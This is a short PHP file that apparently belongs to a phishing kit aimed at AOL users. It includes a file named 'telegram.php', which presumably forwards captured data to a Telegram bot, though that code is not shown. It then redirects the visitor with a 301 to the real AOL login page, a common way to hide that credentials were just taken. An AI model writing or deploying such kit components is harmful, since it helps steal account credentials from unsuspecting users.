<?php 
include('../telegram.php'); 

header("HTTP/1.1 301 Moved Permanently");
header('Location: http://login.aol.com' , true, 301);
    exit;
?>